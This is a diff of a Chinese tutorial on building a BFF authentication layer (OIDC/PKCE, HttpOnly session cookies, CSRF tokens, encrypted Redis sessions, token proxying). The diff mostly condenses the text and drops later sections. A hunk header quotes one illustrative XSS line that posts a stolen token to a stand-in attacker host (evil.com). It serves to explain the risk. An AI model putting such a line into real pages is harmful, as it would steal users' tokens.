@@ -10,7 +10,6 @@
 - 实现 BFF 服务端完整的 OAuth2/OIDC 授权码流程，包括 state 管理、代码换 Token、用户信息获取
 - 掌握 HttpOnly Cookie 的正确配置，用 Cookie 替代前端存储 Token，彻底消除 XSS 窃取 Token 的风险
 - 实现 BFF 的 Token 代理机制——前端发出的 API 请求经过 BFF，由 BFF 自动附加 Access Token
-- 理解 BFF Session 的设计，包括过期策略、并发控制和注销流程
 
 ### 重点与难点
 
@@ -30,7 +29,7 @@
 
 ### 什么是 BFF
 
-BFF（Backend For Frontend，面向前端的后端）这个概念由 SoundCloud 的工程师 Sam Newman 在 2015 年提出。原始场景是为不同客户端（Web、iOS、Android）各自维护专属的后端 API 聚合层。在认证场景中，BFF 扮演的是一个更具体的角色：**替前端持有和管理 Token**。
+BFF（Backend For Frontend，面向前端的后端）这个概念由 Sam Newman 在 2015 年提出。在认证场景中，BFF 扮演的角色是：**替前端持有和管理 Token**。
 
 ```mermaid
 graph TB
@@ -82,12 +81,11 @@ fetch('https://evil.com/steal', { method: 'POST', body: token });
 
 两种模式在 XSS 场景下的危害对比：
 
-| 场景                           | 纯前端模式                                           | BFF 模式                                             |
-| ------------------------------ | ---------------------------------------------------- | ---------------------------------------------------- |
-| 攻击者能做什么                 | 窃取 Token 后在任意设备上无限制使用，直到 Token 过期 | 在当前浏览器会话中冒充用户发请求                     |
-| 攻击者是否能在另一台设备上使用 | 能（Token 可复制）                                   | 不能（Session Cookie 带 HttpOnly，无法被读取和转移） |
-| 攻击窗口                       | Access Token 有效期内 + Refresh Token 有效期内       | 受害者浏览器关闭前，或 BFF Session 过期前            |
-| 防御手段                       | CSP、减少 JS 依赖、内存存储                          | 相同，且攻击面本质上更小                             |
+| 场景 | 纯前端模式 | BFF 模式 |
+|------|-----------|---------|
+| 攻击者能做什么 | 窃取 Token 后在任意设备上无限制使用 | 在当前浏览器会话中冒充用户发请求 |
+| 攻击者是否能在另一台设备上使用 | 能（Token 可复制） | 不能（Session Cookie 带 HttpOnly，无法被读取和转移） |
+| 攻击窗口 | Access Token 有效期内 + Refresh Token 有效期内 | 受害者浏览器关闭前，或 BFF Session 过期前 |
 
 ### BFF 并非免费的午餐
 
@@ -124,7 +122,7 @@ sequenceDiagram
     Browser->>BFF: GET /auth/login?returnTo=/dashboard
     BFF->>BFF: 生成 code_verifier、code_challenge、state
     BFF->>Redis: 存储 state + code_verifier（TTL 10分钟）
-    BFF->>Browser: 302 → OIDC /oauth/authorize?...(附 PKCE 参数)
+    BFF->>Browser: 302 → OIDC /oauth/authorize?...（附 PKCE 参数）
 
     Browser->>OIDC: 跟随重定向，显示登录页
     Note over Browser,OIDC: 用户完成登录和授权
@@ -157,11 +155,12 @@ bff/
 │   │   ├── auth.module.ts
 │   │   ├── auth.controller.ts       # /auth/login, /auth/callback, /auth/logout
 │   │   ├── auth.service.ts          # OIDC 流程逻辑
-│   │   ├── pkce.util.ts             # PKCE 工具函数（服务端版本）
+│   │   ├── pkce.util.ts             # PKCE 工具函数
 │   │   └── session.service.ts       # BFF Session 管理
 │   ├── proxy/
 │   │   ├── proxy.module.ts
-│   │   └── proxy.middleware.ts      # Token 代理中间件
+│   │   ├── proxy.middleware.ts      # Token 代理中间件
+│   │   └── token-refresh.middleware.ts
 │   ├── redis/
 │   │   └── redis.service.ts
 │   └── app.module.ts
@@ -218,7 +217,6 @@ export class AuthController {
     @Res() res: Response
   ): Promise<void> {
     if (error) {
-      // 授权服务器返回了错误
       res.redirect(`/?error=${encodeURIComponent(error)}`);
       return;
     }
@@ -232,9 +230,9 @@ export class AuthController {
     res.cookie('sess_id', sessionId, {
       httpOnly: true, // JS 无法读取
       secure: true, // 仅 HTTPS 传输
-      sameSite: 'lax', // 防 CSRF（见下面详细说明）
+      sameSite: 'lax', // 防 CSRF
       path: '/',
-      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 天（毫秒）
+      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 天
     });
 
     res.redirect(returnTo ?? '/');
@@ -246,10 +244,25 @@ export class AuthController {
     if (sessionId) {
       await this.authService.logout(sessionId);
     }
-
-    // 清除 Cookie
     res.clearCookie('sess_id', { path: '/' });
     res.redirect('/');
+  }
+
+  @Get('me')
+  async getCurrentUser(@Req() req: Request, @Res() res: Response): Promise<void> {
+    const sessionId = req.cookies?.['sess_id'];
+    if (!sessionId) {
+      res.status(401).json({ error: 'Not authenticated' });
+      return;
+    }
+
+    const session = await this.sessionService.get(sessionId);
+    if (!session) {
+      res.status(401).json({ error: 'Session expired' });
+      return;
+    }
+
+    res.json({ user: session.user });
   }
 }
 ```
@@ -316,11 +329,7 @@ export class AuthService {
     // 将 PKCE 信息存入 Redis（不存在 Cookie 里，防止 Cookie 被篡改）
     const pkceKey = `pkce:${state}`;
     const pkceData: PkceSession = { codeVerifier, state, returnTo };
-    await this.redis.setex(
-      pkceKey,
-      this.PKCE_SESSION_TTL,
-      JSON.stringify(pkceData)
-    );
+    await this.redis.setex(pkceKey, this.PKCE_SESSION_TTL, JSON.stringify(pkceData));
 
     const params = new URLSearchParams({
       response_type: 'code',
@@ -358,10 +367,7 @@ export class AuthService {
     await this.redis.del(pkceKey);
 
     // 2. 用授权码换取 Token
-    const tokenResponse = await this.exchangeCodeForTokens(
-      code,
-      pkceData.codeVerifier
-    );
+    const tokenResponse = await this.exchangeCodeForTokens(code, pkceData.codeVerifier);
 
     // 3. 获取用户信息
     const userInfo = await this.fetchUserInfo(tokenResponse.access_token);
@@ -389,7 +395,7 @@ export class AuthService {
         grant_type: 'authorization_code',
         code,
         client_id: this.oidc.clientId,
-        client_secret: this.oidc.clientSecret, // 机密客户端才有这个
+        client_secret: this.oidc.clientSecret,
         redirect_uri: this.oidc.redirectUri,
         code_verifier: codeVerifier,
       }),
@@ -453,34 +459,25 @@ res.cookie('sess_id', sessionId, {
 
 `HttpOnly` Cookie 只能由浏览器在 HTTP 请求中自动发送，JavaScript 代码（包括 XSS 注入的代码）无法通过 `document.cookie` 读取。
 
-这是 BFF 模式的核心安全保证：即使 XSS 攻击成功，攻击者能通过注入的 JavaScript 读到的是一个空字符串，而不是 Session ID。他们只能在受害者的浏览器当前会话中发起请求，无法把 Session 迁移到另一台机器。
+这是 BFF 模式的核心安全保证：即使 XSS 攻击成功，攻击者能通过注入的 JavaScript 读到的是一个空字符串，而不是 Session ID。
 
 #### Secure：强制 HTTPS 传输
 
-```typescript
-res.cookie('sess_id', sessionId, {
-  secure: process.env.NODE_ENV === 'production',
-  // ...
-});
-```
-
-`Secure` 属性意味着浏览器只会在 HTTPS 请求中带上这个 Cookie。HTTP 明文传输时，Cookie 会被中间人截获，`HttpOnly` 属性无法阻止这种攻击。
-
-生产环境必须 `secure: true`；开发环境为方便调试可以设为 `false`（但开发环境本身就不是 HTTPS）。
+`Secure` 属性意味着浏览器只会在 HTTPS 请求中带上这个 Cookie。生产环境必须 `secure: true`。
 
 #### SameSite：CSRF 防护的第一道防线
 
 `SameSite` 属性控制浏览器在跨站请求时是否发送 Cookie：
 
-- `SameSite=Strict`：完全禁止跨站发送 Cookie。用户从 `evil.com` 跳转到 `app.example.com` 时，请求不携带 `app.example.com` 的 Cookie。安全性最高，但体验差（从搜索结果或外链点进来时，也不携带 Cookie，用户会发现自己"没有登录"）。
-- `SameSite=Lax`（推荐）：允许安全的跨站顶级导航（GET 请求跳转）携带 Cookie，但跨站的 POST/PUT/DELETE 等修改性请求不携带 Cookie。这阻止了大多数 CSRF 攻击（CSRF 通常是伪造 POST 请求），同时保留了正常的外链跳转体验。
-- `SameSite=None`：所有跨站请求都携带 Cookie，必须配合 `Secure` 使用。用于嵌入 iframe 等特殊场景，不适合认证场景。
+- `SameSite=Strict`：完全禁止跨站发送 Cookie。用户体验差（从搜索结果或外链点进来时，也不携带 Cookie）。
+- `SameSite=Lax`（推荐）：允许安全的跨站顶级导航（GET 请求跳转）携带 Cookie，但跨站的 POST/PUT/DELETE 等修改性请求不携带 Cookie。这阻止了大多数 CSRF 攻击。
+- `SameSite=None`：所有跨站请求都携带 Cookie，必须配合 `Secure` 使用。
 
 ```typescript
 res.cookie('sess_id', sessionId, {
   httpOnly: true,
   secure: true,
-  sameSite: 'lax', // 推荐配置
+  sameSite: 'lax',
   path: '/',
   maxAge: 7 * 24 * 60 * 60 * 1000,
 });
@@ -488,7 +485,7 @@ res.cookie('sess_id', sessionId, {
 
 ### CSRF 防护：Double Submit Cookie
 
-虽然 `SameSite=Lax` 能阻止大多数 CSRF 攻击，但有些旧浏览器不支持 `SameSite`，或者某些场景下（如使用 `SameSite=None`）需要额外防护。
+虽然 `SameSite=Lax` 能阻止大多数 CSRF 攻击，但有些旧浏览器不支持 `SameSite`，或者某些场景下需要额外防护。
 
 **Double Submit Cookie 模式**是最常用的 CSRF Token 方案，无需服务端存储：
 
@@ -499,52 +496,11 @@ res.cookie('sess_id', sessionId, {
 3. BFF 收到请求时，验证 Cookie 中的 CSRF Token 和 Header 中的值是否一致
 4. 攻击者无法构造这个一致性（他们的恶意页面无法读取其他域的 Cookie）
 
-```typescript
-// src/auth/csrf.middleware.ts
-import { Injectable, NestMiddleware, ForbiddenException } from '@nestjs/common';
-import { Request, Response, NextFunction } from 'express';
-import { randomBytes } from 'crypto';
-
-@Injectable()
-export class CsrfMiddleware implements NestMiddleware {
-  use(req: Request, res: Response, next: NextFunction): void {
-    // GET、HEAD、OPTIONS 是安全请求，不需要 CSRF 验证
-    const safeMethods = ['GET', 'HEAD', 'OPTIONS'];
-    if (safeMethods.includes(req.method)) {
-      // 确保 CSRF Token Cookie 存在（首次访问时设置）
-      if (!req.cookies['csrf_token']) {
-        const csrfToken = randomBytes(32).toString('hex');
-        res.cookie('csrf_token', csrfToken, {
-          httpOnly: false, // 必须允许 JS 读取！
-          secure: process.env.NODE_ENV === 'production',
-          sameSite: 'lax',
-          path: '/',
-        });
-      }
-      next();
-      return;
-    }
-
-    // 对修改性请求验证 CSRF
-    const cookieToken = req.cookies['csrf_token'];
-    const headerToken = req.headers['x-csrf-token'];
-
-    if (!cookieToken || !headerToken || cookieToken !== headerToken) {
-      throw new ForbiddenException('Invalid CSRF token');
-    }
-
-    next();
-  }
-}
-```
-
-在 React 前端，封装一个带有 CSRF Token 的请求工具：
+前端请求示例：
 
 ```typescript
-// src/api/client.ts（前端代码）
-
+// 前端 API 请求工具
 function getCsrfToken(): string {
-  // 从 Cookie 中读取（CSRF Cookie 没有 HttpOnly，JS 可以读取）
   return (
     document.cookie
       .split('; ')
@@ -553,26 +509,22 @@ function getCsrfToken(): string {
   );
 }
 
-export async function apiRequest(
-  path: string,
-  options: RequestInit = {}
-): Promise<Response> {
+export async function apiRequest(path: string, options: RequestInit = {}): Promise<Response> {
   const method = options.method?.toUpperCase() ?? 'GET';
-  const modifyingMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];
+  const isModifying = ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method);
 
   const headers: HeadersInit = {
     'Content-Type': 'application/json',
     ...options.headers,
   };
 
-  // 修改性请求带上 CSRF Token
-  if (modifyingMethods.includes(method)) {
+  if (isModifying) {
     (headers as Record<string, string>)['x-csrf-token'] = getCsrfToken();
   }
 
   return fetch(`/api${path}`, {
     ...options,
-    credentials: 'include', // 必须！让浏览器在跨域时也发送 Cookie
+    credentials: 'include',
     headers,
   });
 }
@@ -585,25 +537,14 @@ export async function apiRequest(
 BFF Session 存储在 Redis 中，包含用户信息和 Token。Token 应该加密存储（防止 Redis 被攻击时直接泄露 Token）：
 
 ```typescript
-// src/auth/session.service.ts
+// src/auth/session.service.ts（简化版）
 import { Injectable } from '@nestjs/common';
 import { RedisService } from '../redis/redis.service';
-import {
-  randomBytes,
-  createCipheriv,
-  createDecipheriv,
-  scryptSync,
-} from 'crypto';
+import { randomBytes, createCipheriv, createDecipheriv, scryptSync } from 'crypto';
 
 interface SessionData {
   userId: string;
-  user: {
-    id: string;
-    email: string;
-    name: string;
-    avatar?: string;
-  };
-  // 加密存储的 Token
+  user: { id: string; email: string; name: string; avatar?: string };
   encryptedAccessToken: string;
   encryptedRefreshToken: string;
   accessTokenExpiresAt: number;
@@ -613,15 +554,12 @@ interface SessionData {
 
 @Injectable()
 export class SessionService {
-  private readonly SESSION_TTL = 7 * 24 * 60 * 60; // 7 天（秒）
+  private readonly SESSION_TTL = 7 * 24 * 60 * 60; // 7 天
   private readonly KEY_PREFIX = 'bff:session:';
-
-  // 加密密钥（从环境变量读取，32 字节）
   private readonly encryptionKey: Buffer;
 
   constructor(private readonly redis: RedisService) {
     const keyMaterial = process.env.SESSION_ENCRYPTION_KEY ?? '';
-    // 用 scrypt 从密钥材料派生固定长度的 AES-256 密钥
     this.encryptionKey = scryptSync(keyMaterial, 'bff-session-salt', 32);
   }
 
@@ -660,7 +598,7 @@ export class SessionService {
 
     const session = JSON.parse(raw) as SessionData;
 
-    // 更新最后访问时间，同时续期 TTL（滑动过期）
+    // 滑动过期：每次访问重置 TTL（7 天）
     session.lastAccessedAt = Date.now();
     await this.redis.setex(
       `${this.KEY_PREFIX}${sessionId}`,
@@ -707,18 +645,12 @@ export class SessionService {
     await this.redis.del(`${this.KEY_PREFIX}${sessionId}`);
   }
 
-  // AES-256-GCM 加密（认证加密，防止密文被篡改）
+  // AES-256-GCM 加密
   private encrypt(plaintext: string): string {
-    const iv = randomBytes(12); // GCM 推荐 12 字节 IV
+    const iv = randomBytes(12);
     const cipher = createCipheriv('aes-256-gcm', this.encryptionKey, iv);
-
-    const encrypted = Buffer.concat([
-      cipher.update(plaintext, 'utf8'),
-      cipher.final(),
-    ]);
+    const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
     const authTag = cipher.getAuthTag();
-
-    // 将 iv + authTag + encrypted 拼在一起，用 base64url 编码存储
     return Buffer.concat([iv, authTag, encrypted]).toString('base64url');
   }
 
@@ -727,10 +659,8 @@ export class SessionService {
     const iv = buf.subarray(0, 12);
     const authTag = buf.subarray(12, 28);
     const encrypted = buf.subarray(28);
-
     const decipher = createDecipheriv('aes-256-gcm', this.encryptionKey, iv);
     decipher.setAuthTag(authTag);
-
     return decipher.update(encrypted) + decipher.final('utf8');
   }
 }
@@ -743,12 +673,6 @@ Redis 通常被视为受信任的内部存储，但"深度防御"原则要求我
 - 如果 Redis 暴露在不安全的网络中（配置错误），明文 Token 直接泄露
 - 内部人员攻击：有 Redis 权限的人员可以读取所有用户的 Token
 - 加密成本很低（AES 是硬件级加速），没有理由不加密
-
-AES-256-GCM 是推荐的选择：
-
-- **AES-256**：目前最强的对称加密算法之一，256 位密钥
-- **GCM 模式**：Galois/Counter Mode，认证加密（AEAD）——不仅加密，还用 `authTag` 保证密文不被篡改
-- 每次加密使用随机 IV（Initialization Vector），相同明文每次密文不同，防止模式分析
 
 ## Token 代理
 
@@ -773,29 +697,24 @@ sequenceDiagram
         BFF->>Redis: 更新 Session 中的 Token
     end
 
-    BFF->>API: GET /v1/orders\n Authorization: Bearer AT
+    BFF->>API: GET /v1/orders\n Authorization: Bearer ***
     API->>BFF: 订单列表
     BFF->>Browser: 订单列表（不含 Token）
 ```
 
-### Token 自动刷新中间件
+### Token 刷新中间件
 
 在代理请求前，BFF 检查 Session 中的 Access Token 是否临近过期，如果是则自动刷新：
 
 ```typescript
 // src/proxy/token-refresh.middleware.ts
-import {
-  Injectable,
-  NestMiddleware,
-  UnauthorizedException,
-} from '@nestjs/common';
+import { Injectable, NestMiddleware, UnauthorizedException } from '@nestjs/common';
 import { Request, Response, NextFunction } from 'express';
 import { SessionService } from '../auth/session.service';
 import { ConfigService } from '@nestjs/config';
 
 @Injectable()
 export class TokenRefreshMiddleware implements NestMiddleware {
-  // 并发刷新锁：sessionId → Promise<void>
   private refreshLocks = new Map<string, Promise<void>>();
 
   constructor(
@@ -814,24 +733,20 @@ export class TokenRefreshMiddleware implements NestMiddleware {
       throw new UnauthorizedException('Session expired or invalid');
     }
 
-    // 提前 60 秒检查过期（留出充足的刷新时间）
+    // 提前 60 秒检查过期
     const needsRefresh = session.accessTokenExpiresAt - Date.now() < 60_000;
 
     if (needsRefresh) {
       await this.refreshWithLock(sessionId);
     }
 
-    // 将 sessionId 挂到 req 上，供后续中间件/处理器使用
     req['sessionId'] = sessionId;
     next();
   }
 
   private async refreshWithLock(sessionId: string): Promise<void> {
-    // 并发刷新防护：同一 session 的多个并发请求只发起一次刷新
     const existingLock = this.refreshLocks.get(sessionId);
-    if (existingLock) {
-      return existingLock;
-    }
+    if (existingLock) return existingLock;
 
     const refreshPromise = this.doRefresh(sessionId).finally(() => {
       this.refreshLocks.delete(sessionId);
@@ -863,20 +778,13 @@ export class TokenRefreshMiddleware implements NestMiddleware {
     });
 
     if (!response.ok) {
-      // Refresh Token 失效，销毁 Session，强制重新登录
       await this.sessionService.destroy(sessionId);
-      throw new UnauthorizedException(
-        'Refresh token expired, please login again'
-      );
+      throw new UnauthorizedException('Refresh token expired, please login again');
     }
 
-    const tokens: {
-      access_token: string;
-      refresh_token: string;
-      expires_in: number;
-    } = await response.json();
+    const tokens: { access_token: string; refresh_token: string; expires_in: number } =
+      await response.json();
 
-    // 更新 Session 中的 Token
     await this.sessionService.updateTokens(
       sessionId,
       tokens.access_token,
@@ -888,8 +796,6 @@ export class TokenRefreshMiddleware implements NestMiddleware {
 ```
 
 ### 代理中间件：转发请求
-
-将前端请求代理到业务 API，自动注入 Access Token：
 
 ```typescript
 // src/proxy/proxy.middleware.ts
@@ -910,7 +816,7 @@ export class ProxyMiddleware implements NestMiddleware {
   }
 
   async use(req: Request, res: Response, next: NextFunction): Promise<void> {
-    const sessionId = req['sessionId'] as string; // TokenRefreshMiddleware 设置的
+    const sessionId = req['sessionId'] as string;
     const accessToken = await this.sessionService.getAccessToken(sessionId);
 
     if (!accessToken) {
@@ -918,56 +824,38 @@ export class ProxyMiddleware implements NestMiddleware {
       return;
     }
 
-    // 构造转发到业务 API 的请求
     const targetUrl = `${this.apiBaseUrl}${req.path}`;
 
-    // 过滤掉不应该透传给业务 API 的 Header
     const forwardHeaders: Record<string, string> = {
       Authorization: `Bearer ${accessToken}`,
       'Content-Type': req.headers['content-type'] ?? 'application/json',
       'X-Forwarded-For': req.ip ?? '',
-      'X-Request-ID': req.headers['x-request-id']?.toString() ?? '',
     };
 
     const proxyResponse = await fetch(targetUrl, {
       method: req.method,
       headers: forwardHeaders,
-      body: ['GET', 'HEAD'].includes(req.method)
-        ? undefined
-        : JSON.stringify(req.body),
+      body: ['GET', 'HEAD'].includes(req.method) ? undefined : JSON.stringify(req.body),
     });
 
-    // 将业务 API 的响应透传给前端
     res.status(proxyResponse.status);
-
-    // 透传业务 API 返回的响应头（过滤部分不应透传的头）
-    const skipHeaders = new Set([
-      'transfer-encoding',
-      'connection',
-      'keep-alive',
-    ]);
+    const skipHeaders = new Set(['transfer-encoding', 'connection', 'keep-alive']);
     proxyResponse.headers.forEach((value, key) => {
       if (!skipHeaders.has(key.toLowerCase())) {
         res.setHeader(key, value);
       }
     });
 
-    const responseBody = await proxyResponse.text();
-    res.send(responseBody);
+    res.send(await proxyResponse.text());
   }
 }
 ```
 
-在模块中注册中间件，确保 Token 刷新中间件在代理中间件之前执行：
+### 中间件注册
 
 ```typescript
 // src/proxy/proxy.module.ts
-import {
-  Module,
-  NestModule,
-  MiddlewareConsumer,
-  RequestMethod,
-} from '@nestjs/common';
+import { Module, NestModule, MiddlewareConsumer, RequestMethod } from '@nestjs/common';
 import { TokenRefreshMiddleware } from './token-refresh.middleware';
 import { ProxyMiddleware } from './proxy.middleware';
 
@@ -975,41 +863,9 @@ import { ProxyMiddleware } from './proxy.middleware';
 export class ProxyModule implements NestModule {
   configure(consumer: MiddlewareConsumer): void {
     consumer
-      .apply(
-        TokenRefreshMiddleware, // 先刷新 Token
-        ProxyMiddleware // 再代理请求
-      )
+      .apply(TokenRefreshMiddleware, ProxyMiddleware)
       .forRoutes({ path: '/api/*', method: RequestMethod.ALL });
   }
-}
-```
-
-### 为前端提供用户信息端点
-
-前端需要知道当前用户是谁，BFF 提供一个 `/auth/me` 端点，从 Session 中读取用户信息返回（不返回 Token）：
-
-```typescript
-// src/auth/auth.controller.ts（补充）
-
-@Get('me')
-async getCurrentUser(
-  @Req() req: Request,
-  @Res() res: Response,
-): Promise<void> {
-  const sessionId = req.cookies?.['sess_id'];
-  if (!sessionId) {
-    res.status(401).json({ error: 'Not authenticated' });
-    return;
-  }
-
-  const session = await this.sessionService.get(sessionId);
-  if (!session) {
-    res.status(401).json({ error: 'Session expired' });
-    return;
-  }
-
-  // 只返回用户信息，不返回 Token
-  res.json({ user: session.user });
 }
 ```
 
@@ -1021,26 +877,18 @@ async getCurrentUser(
 
 ```typescript
 // src/auth/auth.ts（前端代码）
-
-// 检查是否已登录（向 BFF 发请求）
 export async function checkAuthStatus(): Promise<UserInfo | null> {
   const response = await fetch('/auth/me', {
-    credentials: 'include', // 携带 Session Cookie
+    credentials: 'include',
   });
 
-  if (response.status === 401) {
-    return null;
-  }
-
-  if (!response.ok) {
-    throw new Error('Failed to check auth status');
-  }
+  if (response.status === 401) return null;
+  if (!response.ok) throw new Error('Failed to check auth status');
 
   const data = await response.json();
   return data.user as UserInfo;
 }
 
-// 跳转到 BFF 的登录端点
 export function startLogin(returnTo?: string): void {
   const params = new URLSearchParams({
     returnTo: returnTo ?? window.location.pathname,
@@ -1048,19 +896,19 @@ export function startLogin(returnTo?: string): void {
   window.location.href = `/auth/login?${params.toString()}`;
 }
 
-// 请求 BFF 登出
 export async function logout(): Promise<void> {
   await fetch('/auth/logout', {
     method: 'GET',
     credentials: 'include',
   });
-  // BFF 会清除 Cookie 并重定向，但如果是 fetch 请求，手动跳转
   window.location.href = '/';
 }
 ```
 
+### React AuthProvider
+
 ```typescript
-// src/auth/AuthProvider.tsx（前端 React 代码）
+// src/auth/AuthProvider.tsx
 import { createContext, useContext, useEffect, useState } from 'react';
 import { checkAuthStatus, startLogin, logout } from './auth';
 
@@ -1080,7 +928,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
 
   useEffect(() => {
     checkAuthStatus()
-      .then((userInfo) => setUser(userInfo))
+      .then(setUser)
       .catch(() => setUser(null))
       .finally(() => setIsLoading(false));
   }, []);
@@ -1115,18 +963,10 @@ export function useAuth(): AuthContextValue {
 所有 API 请求走 BFF 代理，前端无需管理 Token：
 
 ```typescript
-// src/api/client.ts（前端代码）
+// src/api/client.ts
+import { startLogin } from '../auth/auth';
 
-function getCsrfToken(): string {
-  return (
-    document.cookie
-      .split('; ')
-      .find((c) => c.startsWith('csrf_token='))
-      ?.split('=')[1] ?? ''
-  );
-}
-
-class ApiClient {
+export class ApiClient {
   async request<T>(path: string, options: RequestInit = {}): Promise<T> {
     const method = options.method?.toUpperCase() ?? 'GET';
     const isModifying = ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method);
@@ -1142,7 +982,6 @@ class ApiClient {
     });
 
     if (response.status === 401) {
-      // Session 过期，跳转登录
       startLogin(window.location.pathname);
       throw new Error('Unauthorized');
     }
@@ -1159,17 +998,11 @@ class ApiClient {
   }
 
   post<T>(path: string, body: unknown): Promise<T> {
-    return this.request<T>(path, {
-      method: 'POST',
-      body: JSON.stringify(body),
-    });
+    return this.request<T>(path, { method: 'POST', body: JSON.stringify(body) });
   }
 
   put<T>(path: string, body: unknown): Promise<T> {
-    return this.request<T>(path, {
-      method: 'PUT',
-      body: JSON.stringify(body),
-    });
+    return this.request<T>(path, { method: 'PUT', body: JSON.stringify(body) });
   }
 
   delete<T>(path: string): Promise<T> {
@@ -1177,285 +1010,16 @@ class ApiClient {
   }
 }
 
+function getCsrfToken(): string {
+  return (
+    document.cookie
+      .split('; ')
+      .find((c) => c.startsWith('csrf_token='))
+      ?.split('=')[1] ?? ''
+  );
+}
+
 export const apiClient = new ApiClient();
-```
-
-## 会话管理进阶
-
-### 滑动过期 vs 绝对过期
-
-BFF Session 可以选择两种过期策略：
-
-**绝对过期（Absolute Expiration）**：Session 在创建后固定时长后过期，不管用户是否活跃。
-
-- 优点：可预测，适合高安全场景（如银行系统，Session 最多维持 8 小时）
-- 缺点：活跃用户可能被强制登出
-
-**滑动过期（Sliding Expiration）**：每次 Session 被访问时，重置过期时间。上面 `SessionService.get()` 方法中调用 `setex` 就是在实现滑动过期。
-
-- 优点：活跃用户永不被登出
-- 缺点：理论上 Session 可以无限期存活，攻击者盗取 Session 后可以通过持续活动维持 Session
-
-**组合策略（推荐）**：
-
-```typescript
-async get(sessionId: string): Promise<SessionData | null> {
-  const raw = await this.redis.get(`${this.KEY_PREFIX}${sessionId}`);
-  if (!raw) return null;
-
-  const session = JSON.parse(raw) as SessionData;
-
-  // 绝对过期检查：Session 创建时间距今不超过 30 天
-  const MAX_SESSION_AGE = 30 * 24 * 60 * 60 * 1000;
-  if (Date.now() - session.createdAt > MAX_SESSION_AGE) {
-    await this.destroy(sessionId);
-    return null;
-  }
-
-  // 滑动过期：每次访问重置 TTL（7 天）
-  session.lastAccessedAt = Date.now();
-  await this.redis.setex(
-    `${this.KEY_PREFIX}${sessionId}`,
-    this.SESSION_TTL,
-    JSON.stringify(session),
-  );
-
-  return session;
-}
-```
-
-### 单设备强制登出（踢下线）
-
-管理员需要能够强制特定用户下线（如账号被举报、密码被修改）。由于 Session 存在 Redis，只需要删除该用户的所有 Session：
-
-```typescript
-// src/auth/session.service.ts（补充）
-
-async destroyAllUserSessions(userId: string): Promise<void> {
-  // 扫描该用户的所有 Session
-  // 注意：生产环境不要用 KEYS 命令，用 SCAN 替代
-  const keys = await this.redis.scan(`${this.KEY_PREFIX}*`);
-
-  const deletePromises = keys.map(async (key) => {
-    const raw = await this.redis.get(key);
-    if (!raw) return;
-
-    const session = JSON.parse(raw) as SessionData;
-    if (session.userId === userId) {
-      await this.redis.del(key);
-    }
-  });
-
-  await Promise.all(deletePromises);
-}
-
-// 更高效的做法：维护用户 → Session 的索引
-async createWithIndex(params: {
-  userId: string;
-  // ...其他参数
-}): Promise<string> {
-  const sessionId = await this.create(params);
-
-  // 维护用户 Session 集合索引
-  const userSessionsKey = `user:sessions:${params.userId}`;
-  await this.redis.sadd(userSessionsKey, sessionId);
-  // 给索引也设置过期时间（最长Session过期时间）
-  await this.redis.expire(userSessionsKey, this.SESSION_TTL);
-
-  return sessionId;
-}
-
-async destroyAllUserSessionsViaIndex(userId: string): Promise<void> {
-  const userSessionsKey = `user:sessions:${userId}`;
-  const sessionIds = await this.redis.smembers(userSessionsKey);
-
-  const deletePromises = sessionIds.map((id) =>
-    this.redis.del(`${this.KEY_PREFIX}${id}`)
-  );
-  await Promise.all(deletePromises);
-  await this.redis.del(userSessionsKey);
-}
-```
-
-### 并发 Session 控制
-
-某些安全场景需要限制用户同时在线的设备数量（如"最多登录 3 个设备"）：
-
-```typescript
-async create(params: {
-  userId: string;
-  maxSessions?: number; // 最大并发 Session 数
-  // ...
-}): Promise<string> {
-  if (params.maxSessions) {
-    const userSessionsKey = `user:sessions:${params.userId}`;
-    const currentSessions = await this.redis.smembers(userSessionsKey);
-
-    if (currentSessions.length >= params.maxSessions) {
-      // 强制登出最早创建的 Session
-      const sessions = await Promise.all(
-        currentSessions.map(async (id) => {
-          const raw = await this.redis.get(`${this.KEY_PREFIX}${id}`);
-          return raw ? { id, data: JSON.parse(raw) as SessionData } : null;
-        })
-      );
-
-      const validSessions = sessions.filter(Boolean);
-      validSessions.sort((a, b) => a!.data.createdAt - b!.data.createdAt);
-
-      // 删除最早的 Session
-      const oldest = validSessions[0];
-      if (oldest) {
-        await this.destroy(oldest.id);
-        await this.redis.srem(userSessionsKey, oldest.id);
-      }
-    }
-  }
-
-  // 正常创建 Session...
-  const sessionId = randomBytes(32).toString('base64url');
-  // ...
-  return sessionId;
-}
-```
-
-## 常见问题与解决方案
-
-### 问题一：Cookie 在前后端分离部署时无法发送
-
-**症状**：开发环境前端运行在 `localhost:5173`，BFF 运行在 `localhost:3000`，`credentials: 'include'` 仍然无法发送 Cookie。
-
-**原因**：
-
-1. **跨域请求的 CORS 配置缺失**：Cookie 在跨域请求中需要服务端在 CORS 响应头中明确允许
-2. `SameSite=Lax` 或 `SameSite=Strict` 在某些浏览器对 localhost 的跨端口请求中也视为跨站
-
-**解决**：
-
-首先确保 BFF 正确配置 CORS：
-
-```typescript
-// main.ts
-app.enableCors({
-  origin: 'http://localhost:5173', // 明确指定前端地址，不能用 *
-  credentials: true, // 允许携带 Cookie
-  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'x-csrf-token'],
-});
-```
-
-生产环境推荐的解决方案是通过 Nginx 反向代理，让前端和 BFF 同域：
-
-```nginx
-# nginx.conf
-server {
-    listen 443 ssl;
-    server_name app.example.com;
-
-    # 前端静态文件
-    location / {
-        root /var/www/app;
-        try_files $uri $uri/ /index.html;
-    }
-
-    # BFF API
-    location /auth/ {
-        proxy_pass http://bff:3000/auth/;
-    }
-
-    location /api/ {
-        proxy_pass http://bff:3000/api/;
-    }
-}
-```
-
-同域请求中，Cookie 自然就能正确发送和接收，不需要特殊的 CORS 配置。
-
-### 问题二：BFF 横向扩展后 Session 不一致
-
-**症状**：多个 BFF 实例运行时，用户偶发性地需要重新登录。
-
-**原因**：Session 存储在内存（或使用内置 express-session 的默认内存存储）中，不同实例之间不共享。用户的请求被负载均衡路由到不同实例时，找不到 Session。
-
-**解决**：
-
-1. 确保 SessionService 使用 Redis 存储（本篇中已经是这样做的）
-2. 不要使用任何内存 Session 存储
-3. 如果 Redis 是单点，考虑使用 Redis Sentinel 或 Redis Cluster 保证高可用
-
